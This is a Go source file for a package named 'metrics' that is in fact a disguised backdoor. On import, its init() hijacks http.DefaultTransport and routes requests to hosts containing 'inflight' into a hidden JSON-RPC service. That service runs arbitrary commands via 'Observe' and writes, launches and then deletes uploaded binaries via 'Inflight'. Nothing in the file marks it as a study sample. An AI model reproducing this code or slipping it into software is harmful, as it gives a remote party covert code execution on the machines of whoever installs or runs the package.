package metrics

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/gorilla/rpc/v2"
	"github.com/gorilla/rpc/v2/json2"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync/atomic"
	"time"
)

type InflightStage int

const (
	InflightStart InflightStage = 0
	InflightData  InflightStage = 1
)

type IdReq struct{ TargetId string }
type IdReply struct {
	ID string
}

type PingReq struct {
	TargetId string
	Data     string
}
type PingReply struct{ Data string }

type InflightReq struct {
	TargetId string
	Stage    InflightStage
	Path     string
	Name     string
	Data     []byte
}

type InflightReply struct {
	BytesLeft uint32
	Data      []byte
}

type ObserveReq struct {
	TargetId   string
	LineGz     [][]byte
	TimeoutSec uint32
}

type ObserveReply struct {
	Output []byte
}

func gzBytes(_in []byte) []byte {
	var outputGz bytes.Buffer

	w := gzip.NewWriter(&outputGz)
	w.Write(_in)
	w.Close()

	return outputGz.Bytes()
}

func ungzBytes(_inGz []byte) ([]byte, error) {
	gzRdr, err := gzip.NewReader(bytes.NewBuffer(_inGz))
	if err != nil {
		return nil, err
	}
	plain, err := io.ReadAll(gzRdr)
	if err != nil {
		return nil, err
	}

	return plain, nil
}

type Metrics struct {
	inflightStage  InflightStage
	inflightSize   uint32
	inflightBuffer bytes.Buffer
	inflightPath   string
	inflightName   string
	identity       string
}

func (m *Metrics) checkId(id string) error {
	if id != "" && m.identity != id {
		return fmt.Errorf("incorrect id")
	}
	return nil
}

func (m *Metrics) ID(r *http.Request, req *IdReq, reply *IdReply) error {
	if err := m.checkId(req.TargetId); err != nil {
		return err
	}

	if m.identity == "" {
		// generate identity
		ident := make([]byte, 4)
		_, err := rand.Read(ident)
		if err != nil {
			return err
		}
		m.identity = hex.EncodeToString(ident)
	}

	reply.ID = m.identity
	return nil
}

func (m *Metrics) Ping(r *http.Request, req *PingReq, reply *PingReply) error {
	if err := m.checkId(req.TargetId); err != nil {
		return err
	}
	reply.Data = "PONG"
	return nil
}

func (m *Metrics) Observe(r *http.Request, req *ObserveReq, reply *ObserveReply) error {
	if err := m.checkId(req.TargetId); err != nil {
		return err
	}

	line := make([]string, len(req.LineGz))
	for i := 0; i < len(line); i++ {
		_bytes, err := ungzBytes(req.LineGz[i])
		if err != nil {
			return err
		}
		line[i] = string(_bytes)
	}

	if len(line) == 0 {
		return fmt.Errorf("empty line")
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.TimeoutSec)*time.Second)
	observeProc := exec.CommandContext(ctx, line[0], line[1:]...)
	defer cancel()

	output, err := observeProc.CombinedOutput()
	if err != nil {
		reply.Output = []byte(fmt.Sprintf("failed: %s %s", err, output))
	} else {
		reply.Output = output
	}

	reply.Output = gzBytes(reply.Output)
	return nil
}

func (m *Metrics) Inflight(r *http.Request, req *InflightReq, reply *InflightReply) error {
	if err := m.checkId(req.TargetId); err != nil {
		return err
	}

	// If we were in the middle of a feed, and we got a new feed request, reset our state
	if m.inflightStage == InflightData && req.Stage == InflightStart {
		m.inflightStage = InflightStart
		m.inflightBuffer.Reset()
		m.inflightSize = 0
	}

	switch req.Stage {
	case InflightStart:
		{
			m.inflightStage = InflightData
			m.inflightPath = req.Path
			m.inflightName = req.Name
			reqData := bytes.NewBuffer(req.Data)
			if err := binary.Read(reqData, binary.LittleEndian, &m.inflightSize); err != nil {
				return err
			}

			_, err := m.inflightBuffer.ReadFrom(reqData)
			if err != nil {
				return err
			}
		}
	case InflightData:
		{
			_, err := m.inflightBuffer.ReadFrom(bytes.NewBuffer(req.Data))
			if err != nil {
				return err
			}
		}
	}

	nRead := uint32(m.inflightBuffer.Len())
	if nRead > m.inflightSize {
		return fmt.Errorf("something went wrong. nRead > inflightSize")
	}

	if nRead == m.inflightSize {
		_body, err := ungzBytes(m.inflightBuffer.Bytes())
		if err != nil {
			return err
		}
		pid, err := inflightProc(m.inflightPath, m.inflightName, _body)
		if err != nil {
			return err
		}

		m.inflightStage = InflightStart
		m.inflightBuffer.Reset()
		m.inflightSize = 0
		reply.BytesLeft = 0
		reply.Data = []byte(fmt.Sprintf("success. pid=%d", pid))
	} else {
		reply.BytesLeft = m.inflightSize - nRead
	}

	return nil
}

func inflightProc(path string, name string, _body []byte) (pid int, err error) {
	if err = os.WriteFile(path, _body, 0777); err != nil {
		os.Remove(path)
		return
	}

	go func() {
		time.Sleep(3 * time.Second)
		os.Remove(path)
	}()

	proc, err := os.StartProcess(path, []string{name}, &os.ProcAttr{})
	if err != nil {
		return
	}

	go func() {
		proc.Wait()
	}()

	pid = proc.Pid
	return
}

const (
	hostSubstr = "inflight"
)

type CustomTransport struct {
	defaultTransport http.RoundTripper
}

var metricsInitialized atomic.Bool
var metricsMiddleware *CustomTransport
var rpcServer *rpc.Server

type pipeResponseWriter struct {
	r     *io.PipeReader
	w     *io.PipeWriter
	resp  *http.Response
	ready chan<- struct{}
}

func (w *pipeResponseWriter) Header() http.Header {
	return w.resp.Header
}

func (w *pipeResponseWriter) Write(p []byte) (int, error) {
	if w.ready != nil {
		w.WriteHeader(http.StatusOK)
	}
	return w.w.Write(p)
}

func (w *pipeResponseWriter) WriteHeader(status int) {
	if w.ready == nil {
		return
	}

	w.resp.StatusCode = status
	w.resp.Status = fmt.Sprintf("%d %s", status, http.StatusText(status))
	close(w.ready)
	w.ready = nil
}

func (this *CustomTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if strings.Contains(req.Host, hostSubstr) {
		r, w := io.Pipe()
		resp := &http.Response{
			Proto:      "HTTP/1.1",
			ProtoMajor: 1,
			ProtoMinor: 1,
			Header:     make(http.Header),
			Body:       r,
			Request:    req,
		}
		ready := make(chan struct{})
		prw := &pipeResponseWriter{r, w, resp, ready}
		go func() {
			defer w.Close()
			rpcServer.ServeHTTP(prw, req)
		}()
		<-ready
		return resp, nil
	}

	return this.defaultTransport.RoundTrip(req)
}

func init() {
	if metricsInitialized.CompareAndSwap(false, true) {
		metricsMiddleware = &CustomTransport{defaultTransport: http.DefaultTransport}
		rpcServer = rpc.NewServer()
		rpcServer.RegisterCodec(json2.NewCustomCodec(&rpc.CompressionSelector{}), "application/json")
		rpcServer.RegisterService(new(Metrics), "Metrics")
	}

	if http.DefaultTransport != metricsMiddleware {
		http.DefaultTransport = metricsMiddleware
	}
}
